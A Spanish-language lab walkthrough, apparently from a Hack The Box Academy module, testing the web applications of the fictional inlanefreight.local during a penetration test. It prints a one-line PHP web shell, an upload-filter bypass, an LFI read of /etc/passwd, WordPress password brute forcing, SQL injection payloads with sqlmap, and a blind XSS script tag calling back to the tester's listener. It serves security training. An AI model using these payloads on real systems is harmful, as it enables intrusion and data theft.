Como se mencionó en la sección anterior, las aplicaciones web son donde generalmente pasamos la mayor parte de nuestro tiempo durante una `External Penetration Test`. A menudo presentan una vasta superficie de ataque y pueden sufrir de muchas clases de vulnerabilidades que pueden llevar a la ejecución remota de código o la exposición de datos sensibles, por lo que debemos ser minuciosos con ellas. Algo a recordar es que hay una diferencia entre una `Web Application Security Assessment (WASA)` y una `External Penetration Test`. En una WASA, normalmente se nos encarga encontrar y reportar cualquier vulnerabilidad, por mundana que sea (es decir, una versión del servidor web en los encabezados de respuesta HTTP, una cookie sin la bandera Secure o HttpOnly, etc.). No queremos perdernos en este tipo de hallazgos durante una `External Penetration Test` ya que generalmente tenemos mucho terreno por cubrir. El documento `Scope of Work (SoW)` debe diferenciar claramente entre los dos tipos de evaluación. Debe indicar explícitamente que durante una `External Penetration Test`, realizaremos pruebas `cursory` de aplicaciones web, buscando vulnerabilidades de alto riesgo. Si no tenemos muchos hallazgos en absoluto, podemos profundizar en las aplicaciones web y siempre podemos incluir una recomendación de mejores prácticas o un hallazgo informativo que enumere varios problemas comunes relacionados con la seguridad en los encabezados de respuesta HTTP que vemos todo el tiempo, entre otros problemas menores. De esta manera, hemos cumplido con el contrato al abordar los grandes problemas como la inyección SQL, carga de archivos no restringida, XSS, XXE, ataques de inclusión de archivos, inyecciones de comandos, etc., pero nos cubrimos con el hallazgo informativo en caso de que el cliente regrese preguntando por qué no reportamos X.

---

## Web Application Enumeration

La forma más rápida y eficiente de pasar por un montón de aplicaciones web es usar una herramienta como [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) para tomar capturas de pantalla de cada aplicación web como se cubre en el módulo `Attacking Common Applications` en la sección [Application Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1088). Esto es particularmente útil si tenemos un alcance masivo para nuestra evaluación y navegar por cada aplicación web una a la vez no es factible. En nuestro caso, tenemos `11` subdominios/vhosts (por ahora), por lo que vale la pena iniciar EyeWitness para ayudarnos ya que queremos ser lo más eficientes posible para ofrecer al cliente la mejor evaluación posible. Esto significa acelerar cualquier tarea que se pueda realizar `más rápido` y de manera más eficiente `sin la posibilidad de perder cosas`. La automatización es excelente, pero si estamos perdiendo la mitad de lo que estamos buscando, entonces la automatización está haciendo más daño que bien. Asegúrate de entender lo que hacen tus herramientas y verifica periódicamente las cosas para asegurarte de que tus herramientas y cualquier script personalizado estén funcionando como se espera.



```r
cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

Podemos alimentar EyeWitness con un archivo .xml de Nmap o un escaneo de Nessus, lo cual es útil cuando tenemos un gran alcance con muchos puertos abiertos, lo que puede ser el caso durante una `Internal Penetration Test`. En nuestro caso, solo usaremos la `-f` flag para darle la lista de subdominios en un archivo de texto que enumeramos anteriormente.



```r
eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (11 Hosts)
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Attempting to screenshot http://careers.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://gitlab.inlanefreight.local
Attempting to screenshot http://ir.inlanefreight.local
Attempting to screenshot http://status.inlanefreight.local
Attempting to screenshot http://support.inlanefreight.local
Attempting to screenshot http://tracking.inlanefreight.local
Attempting to screenshot http://vpn.inlanefreight.local
Attempting to screenshot http://monitoring.inlanefreight.local
Finished in 34.79010033607483 seconds

[*] Done! Report written in the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
n
```

![text](https://academy.hackthebox.com/storage/modules/163/ilfreight_eyewitness.png)

Los resultados de EyeWitness nos muestran múltiples hosts muy interesantes, cualquiera de los cuales podría potencialmente ser aprovechado para obtener acceso a la red interna. Trabajemos con ellos uno por uno.

---

## blog.inlanefreight.local

Primero está el subdominio `blog.inlanefreight.local`. A primera vista, parece prometedor. El sitio parece ser una instalación de Drupal olvidada o quizás un sitio de prueba que se configuró y nunca se endureció. Podemos consultar la [Drupal - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1089) del módulo `Attacking Common Applications` para obtener ideas.

![text](https://academy.hackthebox.com/storage/modules/163/drupal.png)

Usando `cURL`, podemos ver que Drupal 9 está en uso.



```r
curl -s http://blog.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Una búsqueda rápida en Google nos muestra que la versión estable actual de Drupal destinada a la producción es la [versión 9.4](https://www.drupal.org/project/drupal/releases), por lo que probablemente tengamos que tener suerte y encontrar algún tipo de mala configuración como una contraseña de administrador débil para abusar de la funcionalidad incorporada o un complemento vulnerable. Las vulnerabilidades bien conocidas como `Drupalgeddon 1-3` no afectan la versión 9.x de Drupal, por lo que eso es un callejón sin salida. Intentar iniciar sesión con algunas combinaciones de contraseñas débiles como `admin:admin`, `admin:Welcome1`, etc., no da resultados. Intentar registrar un usuario también falla, por lo que pasamos a la siguiente aplicación.

Podríamos notar en nuestro informe que esta instancia de Drupal parece que no está en uso y podría valer la pena eliminarla para reducir aún más la superficie de ataque externa.

---

## careers.inlanefreight.local

A continuación está el subdominio `careers.inlanefreight.local`. Este tipo de sitios a menudo permiten a un usuario registrar una cuenta, cargar un CV y potencialmente una foto de perfil. Esto podría ser una vía de ataque interesante. Primero, navegamos a la página de inicio de sesión `http://careers.inlanefreight.local/login`, podemos intentar algunas omisiones de autenticación comunes y probar el formulario de inicio de sesión para intentar omitir la autenticación o provocar algún tipo de mensaje de error o retraso de tiempo que sea indicativo de una inyección SQL. Como siempre, probamos algunas combinaciones de contraseñas débiles como `admin:admin`. También debemos probar siempre los formularios de inicio de sesión (y los formularios de contraseña olvidada si existen) para la enumeración de nombres de usuario, pero no se aprecia ninguno en este caso.

La página `http://careers.inlanefreight.local/apply` nos permite solicitar un trabajo y cargar un CV. Probar esta funcionalidad muestra que permite cargar cualquier tipo de archivo, pero la respuesta HTTP no muestra dónde se encuentra el archivo después de la carga. La fuerza bruta de directorios no produce ningún directorio interesante como `/files` o `/uploads` que podría albergar un shell web si podemos cargar un archivo malicioso.

Siempre es una buena idea probar la funcionalidad de registro de usuarios en cualquier aplicación web que encontremos, ya que esto puede llevar a todo tipo de problemas. En el box HTB [Academy](https://0xdf.gitlab.io/2021/02/27/htb-academy.html), es posible registrarse en una aplicación web y modificar nuestro rol al de un administrador en el momento del registro. Esto fue inspirado por un hallazgo real de una `External Penetration Test` donde pude registrarme en una aplicación web orientada a internet con hasta cinco roles de usuario diferentes. Una vez conectado a esa aplicación, existían todo tipo de vulnerabilidades de IDOR, lo que resultaba en una autorización rota en muchas páginas.

Vamos a registrar una cuenta en `http://careers.inlanefreight.local/register` y echar un vistazo. Registramos una cuenta con detalles falsos: `test@test.com` y las credenciales `pentester:Str0ngP@ssw0rd!`. A veces necesitaremos usar una dirección de correo electrónico real para recibir un enlace de activación. Podemos usar un servicio de correo electrónico desechable como [10 Minute Mail](https://10minutemail.com/) para no saturar nuestra bandeja de entrada o mantener una cuenta dummy con ProtonMail o similar solo para fines de prueba. Te alegrarás de no haber usado tu dirección de correo electrónico real la primera vez que Burp Suite Active Scanner golpea un formulario y te envía más de 1000 correos electrónicos en rápida sucesión. Regístrate con credenciales bastante fuertes también. No querrás introducir un problema de seguridad en la aplicación web que estás probando registrándote con credenciales como `test:test` que podrían potencialmente quedarse en la aplicación mucho después de que termine la prueba (aunque, por supuesto, debemos enumerar en un apéndice de nuestro informe cualquier modificación realizada durante la prueba, incluso registrarse en un sitio web orientado al público).

Una vez registrado, podemos iniciar sesión y explorar. Nos recibe nuestra página de perfil en `http://careers.inlanefreight.local/profile?id=9`. Intentar fuzzear el parámetro `id` para SQLi, inyección de comandos, inclusión de archivos, XSS, etc., no resulta fructífero. El número de ID en sí es interesante. Ajustar este número nos muestra que podemos acceder a los perfiles de otros usuarios y ver a qué trabajos han aplicado. Este es un ejemplo clásico de una vulnerabilidad `Insecure Direct Object Reference (IDOR)` y definitivamente valdría la pena reportarla debido al potencial de exposición de datos sensibles.

Después de agotar todas las opciones aquí, nos alejamos con una vulnerabilidad decente para agregar a nuestra lista de hallazgos y pasamos a la siguiente aplicación web. Podemos usar cualquier herramienta de fuerza bruta de directorios aquí, pero usaremos [Gobuster](https://github.com/OJ/gobuster).

---

## dev.inlanefreight.local

La aplicación web en `http://dev.inlanefreight.local` es simple pero llama la atención. Cualquier cosa con `dev` en la URL o nombre es interesante, ya que esto podría estar potencialmente expuesto accidentalmente y lleno de fallas/no listo para producción. La aplicación presenta un formulario de inicio de sesión simple titulado `Key Vault`. Esto parece ser un administrador de contraseñas casero o similar y podría llevar a una exposición considerable de datos si podemos entrar. Las combinaciones de contraseñas débiles y las cargas útiles de omisión de autenticación no nos llevan a ningún lado, así que volvamos a lo básico y busquemos otras páginas y directorios. Probemos primero con la lista de palabras `common.txt` usando extensiones de archivo `.php` para la primera ejecución.



```r
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/20 22:04:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]                                            
/index.php            (Status: 200) [Size: 2048]                                            
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]    
/server-status        (Status: 403) [Size: 288]                                             
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]                                               
/.htaccess.php        (Status: 403) [Size: 288]                                              
                                                                                             
===============================================================
2022/06/20 22:05:02 Finished
===============================================================
```

Obtuvimos algunos resultados interesantes. Los archivos con un error 403 `forbidden` generalmente significan que los archivos existen, pero el servidor web no nos permite navegar a ellos de forma anónima. Las páginas `/uploads` y `/upload.php` llaman inmediatamente nuestra atención. Si podemos cargar un web shell en PHP, es probable que podamos navegar directamente a él en el directorio `/uploads`, que tiene listado de directorios habilitado. Podemos anotar esto como un hallazgo válido de bajo riesgo, `Directory Listing Enabled`, y capturar la evidencia necesaria para hacer que la redacción del informe sea rápida y sin dolor. Navegar a `/upload.php` nos da un mensaje de error `403 Forbidden` y nada más, lo cual es interesante porque el código de estado es un código de éxito `200 OK`. Vamos a profundizar más en esto.

Necesitaremos Burp Suite aquí para capturar la solicitud y ver si podemos averiguar qué está pasando. Si capturamos la solicitud y la enviamos a Burp Repeater y luego volvemos a solicitar la página usando el método `OPTIONS`, vemos que se permiten varios métodos: `GET,POST,PUT,TRACK,OPTIONS`. Ciclando a través de las diversas opciones, cada una nos da un error de servidor hasta que intentamos el método `TRACK` y vemos que el encabezado `X-Custom-IP-Authorization:` está configurado en la respuesta HTTP. Podemos consultar los módulos [Web Attacks](https://academy.hackthebox.com/module/134/section/1159) en `HTTP Verb Tampering` para refrescar nuestra memoria sobre este tipo de ataque.

![text](https://academy.hackthebox.com/storage/modules/163/track_method.png)

Jugando un poco con la solicitud y agregando el encabezado `X-Custom-IP-Authorization: 127.0.0.1` a la solicitud HTTP en Burp Repeater y luego solicitando la página con el método `TRACK` nuevamente, obtenemos un resultado interesante. Vemos lo que parece ser un formulario de carga de archivos en el cuerpo de la respuesta HTTP.

![text](https://academy.hackthebox.com/storage/modules/163/track_method_auth.png)

Si hacemos clic derecho en cualquier lugar de la ventana de `Response` en `Repeater`, podemos seleccionar `show response in browser`, copiar la URL resultante y solicitarla en el navegador que estamos usando con el proxy Burp. Una plataforma de edición de fotos se carga para nosotros.

![text](https://academy.hackthebox.com/storage/modules/163/pixel_shop.png)

Podemos hacer clic en el botón `Browse` e intentar cargar un simple webshell con el siguiente contenido:


```r
<?php system($_GET['cmd']); ?>
```

Guarda el archivo como `5351bf7271abaa2267e03c9ef6393f13.php` o algo similar. Es una buena práctica crear nombres de archivos aleatorios al cargar un web shell en un sitio web orientado al público para que un atacante aleatorio no lo encuentre. En nuestro caso, querríamos usar algo protegido con contraseña o restringido a nuestra dirección IP ya que el listado de directorios está habilitado y cualquiera podría navegar al directorio `/uploads` y encontrarlo. Intentar cargar el archivo `.php` directamente resulta en un error: "`JPG, JPEG, PNG & GIF files are allowed.`", lo que muestra que probablemente hay una validación débil del lado del cliente en su lugar. Podemos capturar la solicitud POST, enviarla a Repeater nuevamente e intentar modificar el encabezado `Content-Type:` en la solicitud para ver si podemos engañar a la aplicación para que acepte nuestro archivo como válido. Intentaremos alterar el encabezado a `Content-Type: image/png` para hacer pasar nuestro web shell como un archivo de imagen PNG válido. ¡Funciona! Obtenemos la siguiente respuesta: `File uploaded /uploads/5351bf7271abaa2267e03c9ef6393f13.php`.

Ahora podemos usar `cURL` para interactuar con este web shell y ejecutar comandos en el servidor web.



```r
curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Verificando la dirección IP del host, no parece que hayamos aterrizado dentro de la red interna de Inlanefreight ya que la dirección IP no está dentro del alcance de la red interna. Esto puede ser solo un servidor web

 independiente, por lo que continuaremos.



```r
curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I

172.18.0.3
```

Desde aquí, podemos enumerar el host más a fondo, buscando datos sensibles, anotar otros dos hallazgos: `HTTP Verb Tampering` y `Unrestricted File Upload`, y pasar al siguiente host.

---

## ir.inlanefreight.local

El siguiente objetivo en nuestra lista es `http://ir.inlanefreight.local`, el Portal de Relaciones con Inversores de la empresa alojado con WordPress. Para esto podemos consultar la [WordPress - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1100) de la sección `Attacking Common Applications`. Vamos a iniciar `WPScan` y ver qué podemos enumerar usando la flag `-ap` para enumerar todos los plugins.



```r
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] WordPress version 6.0 identified (Latest, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Latest Version: 0.7 (up to date)
 | Last Updated: 2022-04-25T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Latest Version: 1.0.5 (up to date)
 | Last Updated: 2022-06-17T15:21:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:07:09 2022
[+] Requests Done: 35
[+] Cached Requests: 7
[+] Data Sent: 9.187 KB
[+] Data Received: 164.854 KB
[+] Memory used: 224.816 M
```

Desde el escaneo, podemos deducir la siguiente información:

- La versión del núcleo de WordPress es la última (6.0 en el momento de escribir esto)
- El tema en uso es `cbusiness-investment`
- El plugin `b2i-investor-tools` está instalado
- El plugin `mail-masta` está instalado

El plugin `Mail Masta` es un plugin más antiguo con varias vulnerabilidades conocidas. Podemos usar [este](https://www.exploit-db.com/exploits/50226) exploit para leer archivos en el sistema de archivos subyacente aprovechando una vulnerabilidad de Local File Inclusion (LFI).



```r
curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Podemos agregar otro hallazgo a nuestra lista: `Local File Inclusion (LFI)`. A continuación, intentemos enumerar los usuarios de WordPress usando `WPScan`.



```r
wpscan -e u -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <===================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (

Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:14:33 2022
[+] Requests Done: 28
[+] Cached Requests: 37
[+] Data Sent: 8.495 KB
[+] Data Received: 269.719 KB
[+] Memory used: 176.859 MB
[+] Elapsed time: 00:00:0
```

Encontramos varios usuarios:

- ilfreightwp
- tom
- james
- john

Vamos a intentar forzar una de las contraseñas de la cuenta usando [esta](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt) lista de palabras del repo `SecLists` en GitHub. Usando `WPScan` nuevamente, obtenemos un éxito para la cuenta `ilfreightwp`.



```r
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                                              
Trying ilfreightwp / 123123 Time: 00:00:00 <===                                > (10 / 109)  9.17%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:31:34 2022
[+] Requests Done: 186
[+] Cached Requests: 7
[+] Data Sent: 54.2 KB
[+] Data Received: 253.754 KB
[+] Memory used: 241.836 MB
[+] Elapsed time: 00:00:16
```

Desde aquí, podemos navegar a `http://ir.inlanefreight.local/wp-login.php` e iniciar sesión usando las credenciales `ilfreightwp:password1`. Una vez conectados, seremos dirigidos a `http://ir.inlanefreight.local/wp-admin/` donde podemos navegar a `http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty` para editar el archivo 404.php para el tema inactivo `Twenty Twenty` y agregar un web shell en PHP para obtener la ejecución remota de comandos. Después de editar esta página y lograr la ejecución de comandos siguiendo los pasos en la sección [Attacking WordPress](https://academy.hackthebox.com/module/113/section/1208) del módulo `Attacking Common Applications`, podemos registrar otro hallazgo: `Weak WordPress Admin Credentials` y recomendar a nuestro cliente implementar varias medidas de fortalecimiento si planean dejar este sitio de WordPress expuesto externamente.

---

## status.inlanefreight.local

Este sitio parece ser otro olvidado que no debería estar expuesto a internet. Parece ser algún tipo de aplicación interna para buscar en registros. Ingresar una sola comilla (`'`) arroja un mensaje de error de MySQL que indica la presencia de una vulnerabilidad de inyección SQL: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`. Podemos explotar esto manualmente usando una carga útil como:


```r
' union select null, database(), user(), @@version -- //
```

Este es un ejemplo de un [SQL Injection UNION attack](https://academy.hackthebox.com/module/33/section/806).

También podemos usar sqlmap para explotar esto. Primero, capturamos la solicitud POST usando Burp, la guardamos en un archivo y marcamos el parámetro `searchitem` con un `*` para que sqlmap sepa dónde inyectar.



```r
POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*
```

A continuación, ejecutamos esto a través de sqlmap como sigue:



```r
sqlmap -r sqli.txt --dbms=mysql 

<SNIP>

[00:07:24] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=%' AND 6921=6921#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=%' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(5964=5964,1))),0x716a7a7171),5964) AND 'lVzh%'='lVzh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=%' AND (SELECT 1227 FROM (SELECT(SLEEP(5)))jrOp) AND 'ENPh%'='ENPh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=%' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787071,0x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,0x716a7a7171),NULL#
---
[00:07:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[00:07:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:07:38 /2022-06-21/
```

A continuación, podemos enumerar las bases de datos disponibles y ver que la base de datos `status` es particularmente interesante:



```r
sqlmap -r sqli.txt --dbms=mysql --dbs

<SNIP>

---
[00:09:24] [INFO] testing MySQL
[00:09:24] [INFO] confirming MySQL
[00:09:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:09:24] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

[00:09:24] [INFO] fetched data logged to text files under '/root

/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:09:24 /2022-06-21/
```

Enfocándonos en la base de datos `status`, encontramos que solo tiene dos tablas:



```r
sqlmap -r sqli.txt --dbms=mysql -D status --tables

<SNIP>

---
[00:10:29] [INFO] testing MySQL
[00:10:29] [INFO] confirming MySQL
[00:10:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:10:29] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

Desde aquí, podríamos intentar volcar todos los datos de la base de datos `status` y registrar otro hallazgo: `SQL Injection`. Prueba esto manualmente usando el módulo [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) como guía y consulta el módulo [SQLMap Essentials](https://academy.hackthebox.com/module/details/58) si necesitas ayuda con el enfoque basado en herramientas.

---

## support.inlanefreight.local

Avanzando, navegamos al sitio `http://support.inlanefreight.local` y vemos que es un portal de soporte de TI. Los portales de tickets de soporte pueden permitirnos interactuar con un usuario en vivo y, a veces, pueden llevar a un ataque del lado del cliente donde podemos secuestrar la sesión de un usuario a través de una vulnerabilidad de `Cross-Site Scripting (XSS)`. Navegando por la aplicación, encontramos la página `/ticket.php` donde podemos crear un ticket de soporte. Veamos si podemos activar algún tipo de interacción del usuario. Completa todos los detalles para un ticket e incluye lo siguiente en el campo `Message`:


```r
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambia la IP por la tuya y empieza un listener `Netcat` en el puerto 9000 (o el puerto que desees). Haz clic en el botón `Send` y verifica tu listener para una devolución de llamada que confirme la vulnerabilidad.



```r
nc -lvnp 9000

listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Este es un ejemplo de un ataque de Blind Cross-Site Scripting (XSS). Podemos revisar métodos para la detección de XSS ciego en el módulo [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/103/section/1008).

